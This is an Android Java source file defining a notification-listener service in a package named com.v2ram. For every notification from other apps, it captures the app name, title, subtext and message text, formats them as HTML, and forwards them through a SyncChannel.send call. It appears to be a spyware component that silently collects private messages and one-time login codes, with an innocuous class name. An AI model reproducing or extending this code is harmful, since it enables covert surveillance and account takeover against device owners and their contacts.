// language: Java, file: NoteReader.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NoteReader extends NotificationListenerService {

    static final String TAG = "v2-notif";
    public static volatile NoteReader S;

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        S = this;
        Log.i(TAG, "connected");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        S = null;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification n = sbn.getNotification();
            if (n == null) return;
            Bundle b = n.extras;
            String title = b.getCharSequence("android.title", "").toString();
            String text = b.getCharSequence("android.text", "").toString();
            String sub = b.getCharSequence("android.subText", "").toString();
            if (title.isEmpty() && text.isEmpty()) return;
            String pkg = sbn.getPackageName();
            if (pkg == null || pkg.equals("com.v2ram")) return;

            StringBuilder sb = new StringBuilder();
            sb.append("<b>notif</b> <code>").append(SyncChannel.esc(pkg)).append("</code>\n");
            if (!title.isEmpty()) sb.append("▸ ").append(SyncChannel.esc(title)).append("\n");
            if (!sub.isEmpty()) sb.append("  <i>").append(SyncChannel.esc(sub)).append("</i>\n");
            if (!text.isEmpty()) sb.append(SyncChannel.esc(text));
            new Thread(() -> SyncChannel.send(sb.toString())).start();
        } catch (Throwable t) {
            Log.w(TAG, "notif err", t);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}